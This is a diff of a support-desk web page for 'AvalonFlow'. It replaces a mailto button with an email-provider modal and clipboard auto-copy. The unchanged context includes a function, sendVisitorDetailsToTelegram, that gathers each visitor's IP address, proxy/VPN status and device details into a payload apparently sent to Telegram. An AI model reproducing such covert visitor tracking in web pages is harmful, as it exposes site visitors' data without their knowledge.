@@ -532,13 +532,10 @@ footer {
         <button class="button" onclick="generateTicket()">Generate Ticket Reference</button>
         <p id="ticketResult" style="margin-top:15px; font-weight:bold; color: #a78bfa; word-break: break-all;"></p>
         
-        <!-- Email Support Button -->
-        <a id="emailSupportBtn" href="mailto:avalonflow@usa.com" 
-           class="button" 
-           style="display: block; text-align: center; box-sizing: border-box; text-decoration: none; margin-top: 15px;" 
-           onclick="prepareEmailDraft(event)">
-           📧 Email Support Desk
-        </a>
+        <!-- Email Support Smart Button -->
+        <button class="button" style="background: #2563eb; margin-top: 15px;" onclick="openEmailOptions()">
+           📧 Open Email Support Options
+        </button>
 
         <!-- Copy Ticket Details Button -->
         <button class="button" style="background: rgba(107, 44, 216, 0.4); border: 1px solid rgba(167, 139, 250, 0.3);" onclick="copyTicketDetails()">
@@ -556,6 +553,23 @@ footer {
         <div>
             <strong>🔥 Streak:</strong> <span id="streakCount">0</span> days active
         </div>
+    </div>
+</div>
+
+<!-- Universal Email Options Modal -->
+<div id="emailModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:10000; justify-content:center; align-items:center; padding:20px;">
+    <div style="background:#1a1a1a; border:1px solid rgba(167,139,250,0.3); border-radius:16px; padding:25px; width:100%; max-width:400px; box-shadow:0 10px 30px rgba(0,0,0,0.5);">
+        <h3 style="margin-top:0; color:#a78bfa; font-size:20px;">Choose Email Provider</h3>
+        <p style="font-size:14px; color:#ccc; margin-bottom:15px;">Your ticket details are automatically copied! Select your mail client below:</p>
+        
+        <div style="display:flex; flex-direction:column; gap:10px;">
+            <a id="modalGmail" href="#" target="_blank" class="button" style="text-align:center; background:#ea4335; margin:0; font-size:14px; padding:10px;">Open in Gmail</a>
+            <a id="modalOutlook" href="#" target="_blank" class="button" style="text-align:center; background:#0078d4; margin:0; font-size:14px; padding:10px;">Open in Outlook</a>
+            <a id="modalYahoo" href="#" target="_blank" class="button" style="text-align:center; background:#6001d2; margin:0; font-size:14px; padding:10px;">Open in Yahoo Mail</a>
+            <a id="modalMailto" href="#" class="button" style="text-align:center; background:#333; margin:0; font-size:14px; padding:10px;">Default Phone App (Mailto)</a>
+        </div>
+
+        <button onclick="closeEmailOptions()" style="width:100%; margin-top:15px; background:transparent; border:1px solid #555; color:#fff; padding:10px; border-radius:8px; cursor:pointer;">Close</button>
     </div>
 </div>
 
@@ -660,7 +674,7 @@ async function sendVisitorDetailsToTelegram() {
     }
 
     const isProxy = ipData.proxy || false;
-    const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
+    const ipDisplay = isProxy ? `${ipData.ip} ⚠️️ [Proxy/VPN]` : ipData.ip;
 
     const payload = {
       device: detailedDevice,
@@ -883,8 +897,8 @@ function generateTicket() {
     recordTicketGenerated();
 }
 
-// ---------- Email Support Draft Builder ----------
-function prepareEmailDraft(event) {
+// ---------- Universal Email Options Modal Logic ----------
+function openEmailOptions() {
     const categorySelect = document.getElementById('issueCategory');
     const issueInput = document.getElementById('issueInput');
     
@@ -892,18 +906,39 @@ function prepareEmailDraft(event) {
     const description = issueInput.value ? issueInput.value : "Please find my details below.";
     const ticketRef = lastTicket ? lastTicket : "No ticket generated yet";
 
-    const subject = encodeURIComponent(`Support Request: ${category}`);
-    const body = encodeURIComponent(
+    const recipient = "avalonflow@usa.com";
+    const subject = `Support Request: ${category}`;
+    const body = 
         `Hello AvalonFlow Support Team,\n\n` +
         `I am reaching out regarding assistance on my account.\n\n` +
         `Issue Description:\n${description}\n\n` +
         `Ticket Reference Number: ${ticketRef}\n\n` +
-        `Thank you!`
-    );
+        `Thank you!`;
 
-    const emailBtn = document.getElementById('emailSupportBtn');
-    emailBtn.href = `mailto:avalonflow@usa.com?subject=${subject}&body=${body}`;
-    notify('Opening email client with your ticket details.');
+    // Auto-copy text to clipboard as a safety net backup for mobile devices
+    const textToCopy = 
+        `Support Request: ${category}\n` +
+        `----------------------------------------\n` +
+        `Issue Description:\n${description}\n\n` +
+        `Ticket Reference: ${ticketRef}\n` +
+        `----------------------------------------\n` +
+        `Sent via AvalonFlow Support Desk`;
+    
+    navigator.clipboard.writeText(textToCopy).catch(err => console.log(err));
+
+    // Populate URLs for different providers dynamically
+    document.getElementById('modalGmail').href = `https://mail.google.com/mail/?view=cm&fs=1&to=${encodeURIComponent(recipient)}&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+    document.getElementById('modalOutlook').href = `https://outlook.office.com/mail/deeplink/compose?to=${encodeURIComponent(recipient)}&subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+    document.getElementById('modalYahoo').href = `https://compose.mail.yahoo.com/?to=${encodeURIComponent(recipient)}&subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+    document.getElementById('modalMailto').href = `mailto:${recipient}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+
+    // Show modal
+    document.getElementById('emailModal').style.display = 'flex';
+    notify('📋 Ticket copied! Choose your mail provider.');
+}
+
+function closeEmailOptions() {
+    document.getElementById('emailModal').style.display = 'none';
 }
 
 // ---------- Copy Ticket Details to Clipboard ----------
